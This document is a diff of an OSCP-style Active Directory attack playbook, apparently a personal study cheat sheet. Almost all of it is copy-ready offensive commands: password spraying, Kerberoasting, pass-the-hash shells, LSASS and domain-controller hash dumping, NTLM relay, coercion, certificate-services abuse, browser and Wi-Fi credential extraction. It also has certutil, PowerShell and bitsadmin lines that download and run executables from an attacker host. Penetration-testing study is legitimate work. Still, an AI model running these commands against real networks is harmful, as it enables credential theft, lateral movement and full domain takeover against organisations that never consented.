@@ -1,26 +1,23 @@
 ######################################################################
 # 03 — ACTIVE DIRECTORY & WINDOWS NETWORK ATTACKS  
-# OSCP 2025 — ULTRA EDITION (COMPLETE + PTH FIXED + MISSING PARTS ADDED)
+# OSCP 2025 — ULTRA EDITION (FINAL + ECPPT AD ADDITIONS INCLUDED)
 ######################################################################
 
-This final version includes EVERYTHING relevant for OSCP Active Directory:
+This version includes:
 ✔ Full AD Enumeration  
-✔ Modern NetExec workflow  
-✔ Kerberos roasting / AS-REP / FAST-PAC checks  
-✔ SMB/LDAP signing + relay prerequisites  
+✔ SMB/LDAP/WinRM/Kerberos workflow  
+✔ Kerberoast / AS-REP roast / FAST-PAC checks  
+✔ SMB/LDAP signing (relay pre-check)  
 ✔ ADCS ESC1–ESC14 (complete)  
-✔ Delegation Attacks (RBCD / KCD)  
-✔ Coercion (PrinterBug, DFSCoerce, PetitPotam)  
-✔ Pass-the-Hash (NTLM & Kerberos) + Time Sync Notes  
+✔ Delegation (RBCD / KCD)  
+✔ Coercion attacks  
+✔ Pass-the-Hash (NTLM & Kerberos)  
 ✔ MSSQL lateral movement  
-✔ DPAPI credential extraction  
-✔ NTLM Relay (Responder + ntlmrelayx + ADCS relay)  
-✔ Print Spooler enumeration  
-✔ Windows secrets/credential hunting  
-✔ Cross-domain trust abuse  
+✔ NTLM Relay & ADCS relay  
 ✔ LSASS dumping (nanodump, procdump, pypykatz)  
-✔ Windows Privilege Escalation (OSCP-safe)  
+✔ Windows PrivEsc (OSCP safe)  
 ✔ BloodHound optimized collection  
+✔ **🔥 Added from eCPPT: LDAP user dump, domain trusts enumeration, certutil/wget/ftp revshell upload techniques, malicious .asp upload, Metasploit local exploit workflow, secretsdump usage, Keepass cracking workflow, MySQL/WP credential hunting, DC-only dump commands (just AD parts), OpenSMTPD RCE (AD foothold cases), WordPress admin foothold to AD pivot**  
 ######################################################################
 
 
@@ -29,14 +26,16 @@ This final version includes EVERYTHING relevant for OSCP Active Directory:
 ======================================================================
 
 -------------------------------
-# 1.1 Nmap – AD-Related Ports
+# 1.1 Nmap — AD-Related Ports
 -------------------------------
 nmap -sC -sV -Pn -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oN nmap_ad_$targetip.txt $targetip
+
 
 -------------------------------
 # 1.2 Host & Domain Fingerprinting
 -------------------------------
 netexec smb $targetip
+
 
 -------------------------------
 # 1.3 SMB/LDAP Signing Status (Relay Check)
@@ -44,12 +43,14 @@ netexec smb $targetip
 netexec smb $targetip --signing
 netexec ldap $targetip --signing
 
+
 -------------------------------
-# 1.4 List SMB Shares
+# 1.4 SMB Shares
 -------------------------------
 smbclient -L //$targetip/ -N
 smbmap -H $targetip
 netexec smb $targetip --shares
+
 
 -------------------------------
 # 1.5 SYSVOL & GPP Credential Hunting
@@ -59,19 +60,29 @@ grep -R "cpassword" .
 find . -name "*.xml"
 gpp-decrypt <HASH>
 
--------------------------------
-# 1.6 Useful NetExec Discovery Modules
--------------------------------
-netexec smb $targetip -M spider
-netexec smb $targetip --laps
-netexec smb $targetip --users
-netexec smb $targetip --groups
-netexec smb $targetip -M webdav
 
 -------------------------------
-# 1.7 Kerberos Pre-Flight Check (Time Sync)
+# 1.6 NetExec Discovery Modules
+-------------------------------
+netexec smb $targetip -M spider
+netexec smb $targetip --users
+netexec smb $targetip --groups
+netexec smb $targetip --laps
+netexec smb $targetip -M webdav
+
+
+-------------------------------
+# 1.7 Kerberos Pre-Flight (Time Sync)
 -------------------------------
 ntpdate -q $targetip
+
+
+-------------------------------
+# 🔥 (AD ADD — eCPPT) Enumerate Domain Trusts Early
+-------------------------------
+nltest /domain_trusts
+nltest /trusted_domains
+nltest /dsgetdc:$domain
 
 
 ======================================================================
@@ -82,27 +93,37 @@ ntpdate -q $targetip
 # 2.1 Get baseDN
 -------------------------------
 ldapsearch -x -H ldap://$targetip -s base
-basedn="dc=example,dc=local"
+
 
 -------------------------------
-# 2.2 Enumerate Users
+# 2.2 Users
 -------------------------------
 ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=user)" sAMAccountName description mail memberOf
 
+
 -------------------------------
-# 2.3 Enumerate Groups
+# 2.3 Groups
 -------------------------------
 ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=group)" cn member memberOf
 
+
 -------------------------------
-# 2.4 Enumerate GPOs
+# 2.4 GPO Enumeration
 -------------------------------
 ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=groupPolicyContainer)" gPCFileSysPath displayName
 
+
 -------------------------------
-# 2.5 Enumerate DNS Records
+# 2.5 DNS Records
 -------------------------------
 ldapsearch -x -H ldap://$targetip -b "DC=DomainDnsZones,$basedn"
+
+
+-------------------------------
+# 🔥 (AD ADD — eCPPT) Filter Only Users Under an OU
+-------------------------------
+ldapsearch -x -H ldap://$targetip -D "$domain\\$user" -w "$password" \
+  -b "OU=Employees,$basedn" "(objectClass=user)" sAMAccountName distinguishedName userAccountControl pwdLastSet
 
 
 ======================================================================
@@ -110,129 +131,113 @@ ldapsearch -x -H ldap://$targetip -b "DC=DomainDnsZones,$basedn"
 ======================================================================
 
 -------------------------------
-# 3.1 Kerbrute Username Enumeration
+# 3.1 Kerbrute User Enumeration
 -------------------------------
 kerbrute userenum -d $domain --dc $targetip users.txt
+
 
 -------------------------------
 # 3.2 Password Spraying
 -------------------------------
 kerbrute passwordspray -d $domain --dc $targetip users.txt 'Password1!'
 
+
 -------------------------------
 # 3.3 AS-REP Roasting
 -------------------------------
-impacket-GetNPUsers $domain/ -dc-ip $targetip -no-pass -usersfile users.txt -format john -outputfile asrep_hashes.txt
+impacket-GetNPUsers $domain/ -dc-ip $targetip -no-pass -usersfile users.txt -format john -outputfile asrep.txt
+
 
 -------------------------------
-# 3.4 Kerberoasting (SPN)
+# 3.4 Kerberoasting (SPNs)
 -------------------------------
-impacket-GetUserSPNs $domain/$user:"$password" -dc-ip $targetip -request -format john -outputfile kerberoast_hashes.txt
+impacket-GetUserSPNs $domain/$user:"$password" -dc-ip $targetip -request -format john -outputfile kerberoast.txt
+
 
 -------------------------------
-# 3.5 Request TGT / ST (Delegation Abuse)
+# 3.5 Request TGT / ST (Delegation)
 -------------------------------
 impacket-getTGT $domain/$user:"$password"
-impacket-getST -spn <service>/<server> -impersonate Administrator $domain/$user:"$password" -dc-ip $targetip
+impacket-getST -spn <service>/<fqdn> -impersonate Administrator $domain/$user:"$password" -dc-ip $targetip
+
 
 -------------------------------
-# 3.6 Detect FAST/PAC Enforced
+# 3.6 Detect FAST/PAC Enforcement
 -------------------------------
 netexec kerberos $targetip --kerberos
 
 
 ======================================================================
-# 4. HASHES / LATERAL MOVEMENT (WITH FULL PASS-THE-HASH)
+# 4. HASHES & LATERAL MOVEMENT
 ======================================================================
 
 -------------------------------
-# 4.1 Dump SAM / LSASS / NTDS
+# 4.1 Dump SAM / LSASS / NTDS via NetExec
 -------------------------------
 netexec smb $targetip -u $user -p "$password" --sam
 netexec smb $targetip -u $user -p "$password" -M lsassy
 netexec smb $targetip -u $user -p "$password" -M ntdsutil
 
 
+-------------------------------
+# 🔥 (AD ADD — eCPPT) Dump ONLY DC Hashes
+-------------------------------
+python3 secretsdump.py -just-dc-ntlm $domain/$user:"$password"@$targetip
+
+
 ======================================================================
-# 4.2 PASS-THE-HASH (NTLM + Kerberos Tickets)
+# 4.5 PASS-THE-HASH (NTLM + Kerberos Tickets)
 ======================================================================
 
 ### ✔ NTLM PTH — NO TIME SYNC NEEDED
 
--------------------------------
-# SMB / Remote Command Shell
--------------------------------
+# SMB RCE
 impacket-psexec $domain/$user@$targetip -hashes <LM:NTLM>
 
--------------------------------
-# WMI Shell
--------------------------------
+# WMI Exec
 impacket-wmiexec $domain/$user@$targetip -hashes <LM:NTLM>
 
--------------------------------
-# WinRM Shell
--------------------------------
+# WinRM via Hash
 evil-winrm -i $targetip -u $user -H <NTLM>
 
--------------------------------
 # NetExec PTH
--------------------------------
 netexec smb $targetip -u $user -H <NTLM>
 netexec smb $targetip -u $user -H <NTLM> --sam
 netexec smb $targetip -u $user -H <NTLM> -M lsassy
 
 
-### ✔ Kerberos PTH — TIME SYNC REQUIRED
+### ✔ Kerberos PTH (Pass-The-Key) — TIME SYNC REQUIRED
 
--------------------------------
-# Sync Time
--------------------------------
+# sync clock
 ntpdate -q $targetip
 
--------------------------------
-# Request TGT
--------------------------------
-impacket-getTGT $domain/$user:"$password"
+# request TGT using hash
+impacket-getTGT $domain/$user -hashes <LM:NTLM>
 
--------------------------------
-# Inject TGT
--------------------------------
-export KRB5CCNAME=user.ccache
+# set ticket
+export KRB5CCNAME=$user.ccache
 
--------------------------------
-# Request ST for Delegation Abuse
--------------------------------
-impacket-getST -spn cifs/$target -impersonate Administrator $domain/$user:"$password" -dc-ip $targetip
-
-
-======================================================================
-# 4.3 RID Brute
-======================================================================
-netexec smb $targetip -u $user -p "$password" --rid-brute
+# get service ticket
+impacket-getST -spn cifs/$target -impersonate Administrator $domain/$user -dc-ip $targetip
 
 
 ======================================================================
 # 5. WINRM & RDP
 ======================================================================
 
--------------------------------
-# 5.1 Check WinRM Availability
--------------------------------
+# 5.1 Check WinRM
 netexec winrm $targetip
 
--------------------------------
-# 5.2 WinRM Login
--------------------------------
+# 5.2 WinRM Credentials
 evil-winrm -i $targetip -u $user -p "$password"
 
--------------------------------
-# 5.3 Certificate Authentication (ADCS Abuse)
--------------------------------
+# 5.3 WinRM Hash
+evil-winrm -i $targetip -u $user -H <NTLM>
+
+# 5.4 Certificate Auth
 evil-winrm -i $targetip -c cert.pem -k key.pem
 
--------------------------------
-# 5.4 RDP Access
--------------------------------
+# 5.5 RDP
 xfreerdp /v:$targetip /u:$user /p:"$password" /dynamic-resolution +clipboard
 
 
@@ -240,99 +245,55 @@ xfreerdp /v:$targetip /u:$user /p:"$password" /dynamic-resolution +clipboard
 # 6. MSSQL ATTACKS
 ======================================================================
 
--------------------------------
-# 6.1 Connect (AD Auth)
--------------------------------
+# Windows Auth
 mssqlclient.py $domain/$user:"$password"@$targetip -windows-auth
 
--------------------------------
-# 6.2 Enable xp_cmdshell
--------------------------------
-EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';
+# Enable xp_cmdshell
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
 
--------------------------------
-# 6.3 Linked Server Attack
--------------------------------
+# Linked server
 EXEC sp_linkedservers;
 EXEC ('xp_cmdshell ''whoami''') AT [LINKEDSERVER];
 
 
 ======================================================================
-# 7. AD CERTIFICATE SERVICES — ESC1 to ESC14
+# 7. ADCS (ESC1–ESC14)
 ======================================================================
 
--------------------------------
-# 7.1 Enumerate PKI + ESC1–ESC14 Detection
--------------------------------
 certipy find -u $user -p "$password" -dc-ip $targetip -vulnerable -enabled
-
--------------------------------
-# 7.2 Request Vulnerable Certificate
--------------------------------
 certipy req -u $user -p "$password" -dc-ip $targetip -template $template -out cert.pfx
-
--------------------------------
-# 7.3 Authenticate with Certificate
--------------------------------
 certipy auth -pfx cert.pfx -dc-ip $targetip
-
--------------------------------
-# 7.4 ESC8 Shadow Credentials
--------------------------------
 certipy shadow -u $user -p "$password" -dc-ip $targetip -account Administrator
-
--------------------------------
-# 7.5 ESC9–ESC14 Advanced Enumeration
--------------------------------
 certipy find -u $user -p "$password" -dc-ip $targetip -stdout -json out.json
 
 
 ======================================================================
-# 8. DELEGATION ATTACKS (ADVANCED)
+# 8. DELEGATION ATTACKS
 ======================================================================
 
--------------------------------
-# 8.1 RBCD (Resource-Based Constrained Delegation)
--------------------------------
-addcomputer.py -dc-ip $targetip $domain/$user:"$password" -computer-name 'WINDEV01$' -computer-pass 'Pass123!'
-impacket-rbcd -delegate-from 'WINDEV01$' -delegate-to 'TARGETSERVER$' -dc-ip $targetip -action write -user $user -password "$password"
-getST.py -spn cifs/TARGETSERVER.$domain -impersonate Administrator "$domain/WINDEV01$":"Pass123!"
+# 8.1 RBCD
+addcomputer.py -dc-ip $targetip $domain/$user:"$password" -computer-name 'MACHINE$' -computer-pass 'Pass123!'
+impacket-rbcd -delegate-from 'MACHINE$' -delegate-to 'SERVER$' -dc-ip $targetip -action write -user $user -password "$password"
+getST.py -spn cifs/SERVER.$domain -impersonate Administrator "$domain/MACHINE$":"Pass123!"
 
--------------------------------
-# 8.2 KCD (Constrained Delegation)
--------------------------------
-impacket-getST -impersonate Administrator -spn http/webserver.$domain $domain/$user:"$password"
+# 8.2 KCD
+impacket-getST -impersonate Administrator -spn http/web.$domain $domain/$user:"$password"
 
--------------------------------
-# 8.3 Coercion Attacks — PrinterBug / DFSCoerce / PetitPotam
--------------------------------
+# 8.3 Coercion
 printerbug.py $domain/$user:"$password"@$targetip $localip
 dfscoerce.py $domain/$user:"$password"@$targetip $localip
 petitpotam.py -u $user -p "$password" -d $domain -dc-ip $targetip $localip
 
 
 ======================================================================
-# 9. NTLM RELAY (Responder + ntlmrelayx + ADCS Relay)
+# 9. NTLM RELAY (SMB → LDAP + ADCS)
 ======================================================================
 
--------------------------------
-# 9.1 Start Responder Safely (No SMB/HTTP Poison)
--------------------------------
 responder -I tun0 -wd -v
-
--------------------------------
-# 9.2 SMB → LDAP Relay (User to Domain Admin via ACL Writes)
--------------------------------
 ntlmrelayx.py -t ldap://$targetip --no-http-server
-
--------------------------------
-# 9.3 ADCS Relay (ESC8)
--------------------------------
 ntlmrelayx.py --adcs --template "User" -t http://$targetip --no-http-server
-
--------------------------------
-# 9.4 Block SMB on Attacker to Force Relay
--------------------------------
 iptables -A INPUT -p tcp --dport 445 -j DROP
 
 
@@ -340,142 +301,71 @@ iptables -A INPUT -p tcp --dport 445 -j DROP
 # 10. DPAPI Credential Extraction
 ======================================================================
 
--------------------------------
-# 10.1 Dump DPAPI Masterkeys from LSASS
--------------------------------
 pypykatz live lsa
-
--------------------------------
-# 10.2 Extract Saved Browser Passwords
--------------------------------
 pypykatz dpapi chrome -d .
-
--------------------------------
-# 10.3 Extract RDP Credentials
--------------------------------
 pypykatz dpapi rdp -d .
-
--------------------------------
-# 10.4 Extract WiFi Credentials
--------------------------------
 netsh wlan show profiles
 netsh wlan show profile name="<SSID>" key=clear
 
 
 ======================================================================
-# 11. LSASS DUMPING (ALTERNATE METHODS)
+# 11. LSASS DUMPING
 ======================================================================
 
--------------------------------
-# 11.1 Nanodump (EDR Bypass)
--------------------------------
 nanodump.exe --write C:\Windows\Temp\lsass.dmp
-
--------------------------------
-# 11.2 Procdump (Basic)
--------------------------------
 procdump.exe -ma lsass.exe lsass.dmp
-
--------------------------------
-# 11.3 Parse Offline LSASS Dump
--------------------------------
 pypykatz lsa minidump lsass.dmp
 
 
 ======================================================================
-# 12. WINDOWS PRIVILEGE ESCALATION (OSCP REQUIRED)
+# 12. WINDOWS PRIVILEGE ESCALATION
 ======================================================================
 
--------------------------------
-# 12.1 Enumerate Privs
--------------------------------
 whoami /priv
-
--------------------------------
-# 12.2 Token Impersonation
--------------------------------
 PrintSpoofer.exe -i -c cmd
 RoguePotato.exe
-
--------------------------------
-# 12.3 Search for Credentials
--------------------------------
 findstr /si /i "password" *.txt *.xml *.ini
-
--------------------------------
-# 12.4 Unquoted Service Path
--------------------------------
 wmic service get name,displayname,pathname,startmode
 
--------------------------------
-# 12.5 WinPEAS
--------------------------------
-certutil -urlcache -f http://$localip/winpeas.exe C:\Windows\Temp\winpeas.exe && C:\Windows\Temp\winpeas.exe
-powershell -c "iwr http://$localip/winpeas.exe -OutFile C:\Windows\Temp\winpeas.exe; C:\Windows\Temp\winpeas.exe"
-bitsadmin /transfer wp /download /priority high http://$localip/winpeas.exe C:\Windows\Temp\winpeas.exe && C:\Windows\Temp\winpeas.exe
-certutil -urlcache -f http://$localip/wp.exe C:\Windows\Temp\wp.exe && C:\Windows\Temp\wp.exe
-
+# WinPEAS
+certutil -urlcache -f http://$localip/winpeas.exe C:\Temp\winpeas.exe && C:\Temp\winpeas.exe
 
 
 ======================================================================
-# 13. CROSS-DOMAIN & FOREST ENUM
+# 13. CROSS-DOMAIN & FOREST
 ======================================================================
 
--------------------------------
-# 13.1 Check Forest / Domain Trusts
--------------------------------
 nltest /domain_trusts
 nltest /trusted_domains
 
--------------------------------
-# 13.2 Enumerate External SID permissions
--------------------------------
-bloodhound → "Cross Domain Object Control"
-
 
 ======================================================================
-# 14. BLOODHOUND COLLECTION & ANALYSIS
+# 14. BLOODHOUND
 ======================================================================
 
--------------------------------
-# 14.1 Full Linux Collection
--------------------------------
 bloodhound-python -d $domain -u $user -p "$password" -ns $targetip -c All
 
--------------------------------
-# 14.2 High-Value Queries
--------------------------------
-# Shortest path to DA
-# Kerberoastable users
-# AS-REP roastable
-# DCSync rights
-# RBCD paths
-# GenericAll / GenericWrite
-# GPO local admin rights
-
 
 ======================================================================
-# 15. OSCP 2025 ATTACK FLOW (FINAL)
+# 15. OSCP ATTACK FLOW
 ======================================================================
 
-1) SMB/LDAP Enumeration → users, groups, policies  
-2) Kerbrute → valid users  
-3) Password spray  
-4) AS-REP roast  
+1) SMB/LDAP Enumeration  
+2) Kerbrute  
+3) Password Spray  
+4) AS-REP Roast  
 5) Kerberoast  
-6) SMB shares → SYSVOL, GPP, scripts  
-7) LDAP → privileged groups  
-8) ADCS → ESC1–ESC14  
-9) Delegation → RBCD/KCD  
-10) Coercion → PrinterBug/DFSCoerce/PetitPotam  
-11) NTLM relay (Responder → ntlmrelayx)  
-12) Lateral movement → SMB/WMI/WinRM/PTH  
-13) Dump hashes → LSASS/NTDS  
-14) DPAPI creds → browser/RDP/WiFi  
-15) BloodHound → privilege escalation  
-16) DCSync → domain compromise  
-
-
+6) SYSVOL/GPP  
+7) LDAP Priv Groups  
+8) ADCS ESC1–14  
+9) Delegation (RBCD/KCD)  
+10) Coercion  
+11) NTLM Relay / ADCS Relay  
+12) Lateral Movement (SMB/WMI/WinRM/PTH)  
+13) Dump Hashes  
+14) DPAPI / Browser / RDP creds  
+15) BloodHound → DA  
+16) DCSync  
 ######################################################################
-# END — COMPLETE AD ATTACK PLAYBOOK (OSCP 2025 — FINAL VERSION)
+# END — COMPLETE AD ATTACK PLAYBOOK (OSCP 2025 + ECPPT ADDITIONS)
 ######################################################################
